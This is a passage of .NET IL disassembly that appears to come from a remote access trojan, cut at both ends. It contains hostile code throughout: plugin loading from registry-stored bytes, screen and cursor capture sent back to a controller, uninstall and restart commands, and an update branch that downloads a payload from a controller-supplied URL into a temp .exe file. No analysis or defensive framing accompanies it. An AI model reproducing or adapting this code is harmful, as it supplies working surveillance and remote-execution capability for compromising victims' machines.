      IL_1e25:  ldloc.s    V_146
      IL_1e27:  ldstr      "A"
      IL_1e2c:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_1e31:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1e36:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1e3b:  stloc.s    V_147
      IL_1e3d:  ldloc.s    V_147
      IL_1e3f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1e44:  ldnull
      IL_1e45:  ldstr      "h"
      IL_1e4a:  ldc.i4.1
      IL_1e4b:  newarr     [mscorlib]System.Object
      IL_1e50:  dup
      IL_1e51:  ldc.i4.0
      IL_1e52:  ldsfld     string j.OK::H
      IL_1e57:  stelem.ref
      IL_1e58:  ldnull
      IL_1e59:  ldnull
      IL_1e5a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1e5f:  ldloc.s    V_147
      IL_1e61:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1e66:  ldnull
      IL_1e67:  ldstr      "p"
      IL_1e6c:  ldc.i4.1
      IL_1e6d:  newarr     [mscorlib]System.Object
      IL_1e72:  dup
      IL_1e73:  ldc.i4.0
      IL_1e74:  ldsfld     string j.OK::P
      IL_1e79:  stelem.ref
      IL_1e7a:  ldnull
      IL_1e7b:  ldnull
      IL_1e7c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1e81:  ldloc.s    V_147
      IL_1e83:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1e88:  ldnull
      IL_1e89:  ldstr      "osk"
      IL_1e8e:  ldc.i4.1
      IL_1e8f:  newarr     [mscorlib]System.Object
      IL_1e94:  dup
      IL_1e95:  ldc.i4.0
      IL_1e96:  ldloc.0
      IL_1e97:  ldc.i4.2
      IL_1e98:  ldelem.ref
      IL_1e99:  stelem.ref
      IL_1e9a:  ldnull
      IL_1e9b:  ldnull
      IL_1e9c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1ea1:  ldloc.s    V_147
      IL_1ea3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1ea8:  ldnull
      IL_1ea9:  ldstr      "start"
      IL_1eae:  ldc.i4.0
      IL_1eaf:  newarr     [mscorlib]System.Object
      IL_1eb4:  ldnull
      IL_1eb5:  ldnull
      IL_1eb6:  ldnull
      IL_1eb7:  ldc.i4.1
      IL_1eb8:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_1ebd:  pop
      IL_1ebe:  br.s       IL_1ec6

      IL_1ec0:  ldc.i4.1
      IL_1ec1:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_1ec6:  ldsfld     bool j.OK::Cn
      IL_1ecb:  ldc.i4.0
      IL_1ecc:  ceq
      IL_1ece:  box        [mscorlib]System.Boolean
      IL_1ed3:  ldloc.s    V_147
      IL_1ed5:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1eda:  ldnull
      IL_1edb:  ldstr      "Off"
      IL_1ee0:  ldc.i4.0
      IL_1ee1:  newarr     [mscorlib]System.Object
      IL_1ee6:  ldnull
      IL_1ee7:  ldnull
      IL_1ee8:  ldnull
      IL_1ee9:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_1eee:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1ef3:  ldc.i4.1
      IL_1ef4:  box        [mscorlib]System.Boolean
      IL_1ef9:  ldc.i4.0
      IL_1efa:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_1eff:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1f04:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_1f09:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1f0e:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_1f13:  brfalse.s  IL_1ec0

      IL_1f15:  ldloc.s    V_147
      IL_1f17:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1f1c:  ldnull
      IL_1f1d:  ldstr      "off"
      IL_1f22:  ldc.i4.1
      IL_1f23:  newarr     [mscorlib]System.Object
      IL_1f28:  dup
      IL_1f29:  ldc.i4.0
      IL_1f2a:  ldc.i4.1
      IL_1f2b:  box        [mscorlib]System.Boolean
      IL_1f30:  stelem.ref
      IL_1f31:  ldnull
      IL_1f32:  ldnull
      IL_1f33:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1f38:  leave      IL_26c9

      IL_1f3d:  ldloc.0
      IL_1f3e:  ldc.i4.1
      IL_1f3f:  ldelem.ref
      IL_1f40:  ldc.i4.0
      IL_1f41:  newarr     [mscorlib]System.Byte
      IL_1f46:  call       object j.OK::GTV(string,
                                            object)
      IL_1f4b:  castclass  uint8[]
      IL_1f50:  stloc.s    V_150
      IL_1f52:  ldloc.0
      IL_1f53:  ldc.i4.2
      IL_1f54:  ldelem.ref
      IL_1f55:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1f5a:  ldc.i4.s   10
      IL_1f5c:  clt
      IL_1f5e:  ldloc.s    V_150
      IL_1f60:  ldlen
      IL_1f61:  conv.i4
      IL_1f62:  ldc.i4.0
      IL_1f63:  ceq
      IL_1f65:  and
      IL_1f66:  brfalse.s  IL_1fa5

      IL_1f68:  ldc.i4.5
      IL_1f69:  newarr     [mscorlib]System.String
      IL_1f6e:  dup
      IL_1f6f:  ldc.i4.0
      IL_1f70:  ldstr      "pl"
      IL_1f75:  stelem.ref
      IL_1f76:  dup
      IL_1f77:  ldc.i4.1
      IL_1f78:  ldsfld     string j.OK::Y
      IL_1f7d:  stelem.ref
      IL_1f7e:  dup
      IL_1f7f:  ldc.i4.2
      IL_1f80:  ldloc.0
      IL_1f81:  ldc.i4.1
      IL_1f82:  ldelem.ref
      IL_1f83:  stelem.ref
      IL_1f84:  dup
      IL_1f85:  ldc.i4.3
      IL_1f86:  ldsfld     string j.OK::Y
      IL_1f8b:  stelem.ref
      IL_1f8c:  dup
      IL_1f8d:  ldc.i4.4
      IL_1f8e:  ldc.i4.1
      IL_1f8f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1f94:  stelem.ref
      IL_1f95:  call       string [mscorlib]System.String::Concat(string[])
      IL_1f9a:  call       bool j.OK::Send(string)
      IL_1f9f:  pop
      IL_1fa0:  br         IL_20a9

      IL_1fa5:  ldloc.0
      IL_1fa6:  ldc.i4.2
      IL_1fa7:  ldelem.ref
      IL_1fa8:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1fad:  ldc.i4.s   10
      IL_1faf:  ble.s      IL_1ff9

      IL_1fb1:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_1fb6:  ldloc.0
      IL_1fb7:  ldc.i4.0
      IL_1fb8:  ldelem.ref
      IL_1fb9:  ldsfld     string j.OK::Y
      IL_1fbe:  ldloc.0
      IL_1fbf:  ldc.i4.1
      IL_1fc0:  ldelem.ref
      IL_1fc1:  ldsfld     string j.OK::Y
      IL_1fc6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_1fcb:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1fd0:  stloc.s    V_152
      IL_1fd2:  dup
      IL_1fd3:  ldarg.0
      IL_1fd4:  ldloc.s    V_152
      IL_1fd6:  ldarg.0
      IL_1fd7:  ldlen
      IL_1fd8:  conv.i4
      IL_1fd9:  ldloc.s    V_152
      IL_1fdb:  sub.ovf
      IL_1fdc:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_1fe1:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1fe6:  call       uint8[] j.OK::ZIP(uint8[])
      IL_1feb:  stloc.s    V_150
      IL_1fed:  ldloc.0
      IL_1fee:  ldc.i4.1
      IL_1fef:  ldelem.ref
      IL_1ff0:  ldloc.s    V_150
      IL_1ff2:  ldc.i4.3
      IL_1ff3:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_1ff8:  pop
      IL_1ff9:  ldc.i4.5
      IL_1ffa:  newarr     [mscorlib]System.String
      IL_1fff:  dup
      IL_2000:  ldc.i4.0
      IL_2001:  ldstr      "pl"
      IL_2006:  stelem.ref
      IL_2007:  dup
      IL_2008:  ldc.i4.1
      IL_2009:  ldsfld     string j.OK::Y
      IL_200e:  stelem.ref
      IL_200f:  dup
      IL_2010:  ldc.i4.2
      IL_2011:  ldloc.0
      IL_2012:  ldc.i4.1
      IL_2013:  ldelem.ref
      IL_2014:  stelem.ref
      IL_2015:  dup
      IL_2016:  ldc.i4.3
      IL_2017:  ldsfld     string j.OK::Y
      IL_201c:  stelem.ref
      IL_201d:  dup
      IL_201e:  ldc.i4.4
      IL_201f:  ldc.i4.0
      IL_2020:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_2025:  stelem.ref
      IL_2026:  call       string [mscorlib]System.String::Concat(string[])
      IL_202b:  call       bool j.OK::Send(string)
      IL_2030:  pop
      IL_2031:  ldloc.s    V_150
      IL_2033:  ldstr      "A"
      IL_2038:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_203d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2042:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2047:  stloc.s    V_151
      IL_2049:  ldc.i4.5
      IL_204a:  newarr     [mscorlib]System.String
      IL_204f:  dup
      IL_2050:  ldc.i4.0
      IL_2051:  ldstr      "ret"
      IL_2056:  stelem.ref
      IL_2057:  dup
      IL_2058:  ldc.i4.1
      IL_2059:  ldsfld     string j.OK::Y
      IL_205e:  stelem.ref
      IL_205f:  dup
      IL_2060:  ldc.i4.2
      IL_2061:  ldloc.0
      IL_2062:  ldc.i4.1
      IL_2063:  ldelem.ref
      IL_2064:  stelem.ref
      IL_2065:  dup
      IL_2066:  ldc.i4.3
      IL_2067:  ldsfld     string j.OK::Y
      IL_206c:  stelem.ref
      IL_206d:  dup
      IL_206e:  ldc.i4.4
      IL_206f:  ldloc.s    V_151
      IL_2071:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2076:  ldnull
      IL_2077:  ldstr      "GT"
      IL_207c:  ldc.i4.0
      IL_207d:  newarr     [mscorlib]System.Object
      IL_2082:  ldnull
      IL_2083:  ldnull
      IL_2084:  ldnull
      IL_2085:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_208a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_208f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_2094:  stloc.s    V_153
      IL_2096:  ldloca.s   V_153
      IL_2098:  call       string j.OK::ENB(string&)
      IL_209d:  stelem.ref
      IL_209e:  call       string [mscorlib]System.String::Concat(string[])
      IL_20a3:  call       bool j.OK::Send(string)
      IL_20a8:  pop
      IL_20a9:  leave      IL_26c9

      IL_20ae:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_20b3:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_20b8:  stloc.s    V_154
      IL_20ba:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_20bf:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_20c4:  stloc.s    V_19
      IL_20c6:  ldloca.s   V_19
      IL_20c8:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_20cd:  ldloca.s   V_154
      IL_20cf:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_20d4:  ldc.i4     0x21005
      IL_20d9:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32,
                                                                                      valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
      IL_20de:  stloc.s    V_155
      IL_20e0:  ldloc.s    V_155
      IL_20e2:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_20e7:  stloc.s    V_156
      IL_20e9:  ldloc.s    V_155
      IL_20eb:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_20f0:  ldloc.s    V_155
      IL_20f2:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_20f7:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_20fc:  stloc.s    V_157
      IL_20fe:  ldloc.s    V_156
      IL_2100:  ldc.i4.0
      IL_2101:  ldc.i4.0
      IL_2102:  ldc.i4.0
      IL_2103:  ldc.i4.0
      IL_2104:  ldloc.s    V_157
      IL_2106:  ldc.i4     0xcc0020
      IL_210b:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      .try
      {
        IL_2110:  ldc.i4.s   32
        IL_2112:  ldc.i4.s   32
        IL_2114:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_2119:  stloc.s    V_157
        IL_211b:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_2120:  ldloc.s    V_157
        IL_2122:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_2127:  stloc.s    V_154
        IL_2129:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_212e:  ldloc.s    V_156
        IL_2130:  ldloc.s    V_154
        IL_2132:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_2137:  leave.s    IL_2154

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_2139:  dup
        IL_213a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_213f:  stloc.s    V_162
        IL_2141:  ldloc.s    V_162
        IL_2143:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2148:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_214d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_2152:  leave.s    IL_2154

      }  // end handler
      IL_2154:  ldloc.s    V_156
      IL_2156:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_215b:  ldloc.0
      IL_215c:  ldc.i4.1
      IL_215d:  ldelem.ref
      IL_215e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_2163:  ldloc.0
      IL_2164:  ldc.i4.2
      IL_2165:  ldelem.ref
      IL_2166:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_216b:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_2170:  stloc.s    V_158
      IL_2172:  ldloc.s    V_158
      IL_2174:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_2179:  stloc.s    V_156
      IL_217b:  ldloc.s    V_156
      IL_217d:  ldloc.s    V_155
      IL_217f:  ldc.i4.0
      IL_2180:  ldc.i4.0
      IL_2181:  ldloc.s    V_158
      IL_2183:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_2188:  ldloc.s    V_158
      IL_218a:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_218f:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawImage(class [System.Drawing]System.Drawing.Image,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32)
      IL_2194:  ldloc.s    V_156
      IL_2196:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_219b:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_21a0:  stloc.s    V_159
      IL_21a2:  ldstr      "CAP"
      IL_21a7:  ldsfld     string j.OK::Y
      IL_21ac:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_21b1:  stloc.s    V_153
      IL_21b3:  ldloca.s   V_153
      IL_21b5:  call       uint8[] j.OK::SB(string&)
      IL_21ba:  starg.s    b
      IL_21bc:  ldloc.s    V_159
      IL_21be:  ldarg.0
      IL_21bf:  ldc.i4.0
      IL_21c0:  ldarg.0
      IL_21c1:  ldlen
      IL_21c2:  conv.i4
      IL_21c3:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_21c8:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_21cd:  stloc.s    V_160
      IL_21cf:  ldloc.s    V_158
      IL_21d1:  ldloc.s    V_160
      IL_21d3:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_21d8:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_21dd:  ldloc.s    V_160
      IL_21df:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_21e4:  call       string j.OK::md5(uint8[])
      IL_21e9:  stloc.s    V_161
      IL_21eb:  ldloc.s    V_161
      IL_21ed:  ldsfld     string j.OK::lastcap
      IL_21f2:  ldc.i4.0
      IL_21f3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_21f8:  brfalse.s  IL_221a

      IL_21fa:  ldloc.s    V_161
      IL_21fc:  stsfld     string j.OK::lastcap
      IL_2201:  ldloc.s    V_159
      IL_2203:  ldloc.s    V_160
      IL_2205:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_220a:  ldc.i4.0
      IL_220b:  ldloc.s    V_160
      IL_220d:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_2212:  conv.ovf.i4
      IL_2213:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_2218:  br.s       IL_2222

      IL_221a:  ldloc.s    V_159
      IL_221c:  ldc.i4.0
      IL_221d:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
      IL_2222:  ldloc.s    V_159
      IL_2224:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_2229:  call       bool j.OK::Sendb(uint8[])
      IL_222e:  pop
      IL_222f:  ldloc.s    V_159
      IL_2231:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_2236:  ldloc.s    V_160
      IL_2238:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_223d:  ldloc.s    V_155
      IL_223f:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_2244:  ldloc.s    V_158
      IL_2246:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_224b:  leave      IL_26c9

      IL_2250:  ldloc.0
      IL_2251:  ldc.i4.1
      IL_2252:  ldelem.ref
      IL_2253:  stloc.s    V_153
      IL_2255:  ldloc.s    V_153
      IL_2257:  ldstr      "~"
      IL_225c:  ldc.i4.0
      IL_225d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_2262:  brfalse.s  IL_2284

      IL_2264:  ldloc.s    V_153
      IL_2266:  ldstr      "!"
      IL_226b:  ldc.i4.0
      IL_226c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_2271:  brfalse.s  IL_228b

      IL_2273:  ldloc.s    V_153
      IL_2275:  ldstr      "@"
      IL_227a:  ldc.i4.0
      IL_227b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_2280:  brfalse.s  IL_2298

      IL_2282:  br.s       IL_22b3

      IL_2284:  call       void j.OK::UNS()
      IL_2289:  br.s       IL_22b3

      IL_228b:  ldc.i4.0
      IL_228c:  call       void j.OK::pr(int32)
      IL_2291:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_2296:  br.s       IL_22b3

      IL_2298:  ldc.i4.0
      IL_2299:  call       void j.OK::pr(int32)
      IL_229e:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_22a3:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_22a8:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_22ad:  pop
      IL_22ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_22b3:  leave      IL_26c9

      IL_22b8:  ldloc.2
      IL_22b9:  ldstr      "up"
      IL_22be:  ldc.i4.0
      IL_22bf:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_22c4:  brtrue     IL_2481

      IL_22c9:  ldnull
      IL_22ca:  stloc.s    V_6
      IL_22cc:  ldloc.0
      IL_22cd:  ldc.i4.1
      IL_22ce:  ldelem.ref
      IL_22cf:  ldc.i4.0
      IL_22d0:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_22d5:  ldc.i4.s   31
      IL_22d7:  bne.un.s   IL_2355

      .try
      {
        IL_22d9:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_22de:  ldloc.0
        IL_22df:  ldc.i4.0
        IL_22e0:  ldelem.ref
        IL_22e1:  ldsfld     string j.OK::Y
        IL_22e6:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_22eb:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_22f0:  stloc.s    V_163
        IL_22f2:  dup
        IL_22f3:  ldarg.0
        IL_22f4:  ldloc.s    V_163
        IL_22f6:  ldarg.0
        IL_22f7:  ldlen
        IL_22f8:  conv.i4
        IL_22f9:  ldloc.s    V_163
        IL_22fb:  sub.ovf
        IL_22fc:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_2301:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_2306:  call       uint8[] j.OK::ZIP(uint8[])
        IL_230b:  stloc.s    V_6
        IL_230d:  leave      IL_23ad

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_2312:  dup
        IL_2313:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2318:  stloc.s    V_164
        IL_231a:  ldloc.s    V_164
        IL_231c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2321:  ldstr      "MSG"
        IL_2326:  ldsfld     string j.OK::Y
        IL_232b:  ldstr      "Update ERROR"
        IL_2330:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_2335:  call       bool j.OK::Send(string)
        IL_233a:  pop
        IL_233b:  ldstr      "bla"
        IL_2340:  call       bool j.OK::Send(string)
        IL_2345:  pop
        IL_2346:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_234b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_2350:  leave      IL_26c9

      }  // end handler
      IL_2355:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_235a:  stloc.s    V_7
      .try
      {
        IL_235c:  ldloc.s    V_7
        IL_235e:  ldloc.0
        IL_235f:  ldc.i4.1
        IL_2360:  ldelem.ref
        IL_2361:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_2366:  stloc.s    V_6
        IL_2368:  leave.s    IL_23ad

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_236a:  dup
        IL_236b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2370:  stloc.s    V_165
        IL_2372:  ldloc.s    V_165
        IL_2374:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2379:  ldstr      "MSG"
        IL_237e:  ldsfld     string j.OK::Y
        IL_2383:  ldstr      "Update ERROR"
        IL_2388:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_238d:  call       bool j.OK::Send(string)
        IL_2392:  pop
        IL_2393:  ldstr      "bla"
        IL_2398:  call       bool j.OK::Send(string)
        IL_239d:  pop
        IL_239e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_23a3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_23a8:  leave      IL_26c9

      }  // end handler
      IL_23ad:  ldstr      "bla"
      IL_23b2:  call       bool j.OK::Send(string)
      IL_23b7:  pop
      IL_23b8:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_23bd:  call       valuetype [mscorlib]System.Guid [mscorlib]System.Guid::NewGuid()
      IL_23c2:  stloc.s    V_143
      IL_23c4:  ldloca.s   V_143
      IL_23c6:  constrained. [mscorlib]System.Guid
      IL_23cc:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_23d1:  ldstr      "-"
      IL_23d6:  ldstr      ""
      IL_23db:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_23e0:  ldstr      ".exe"
      IL_23e5:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_23ea:  stloc.s    V_8
      .try
      {
        IL_23ec:  ldstr      "MSG"
        IL_23f1:  ldsfld     string j.OK::Y
        IL_23f6:  ldstr      "Updating To "
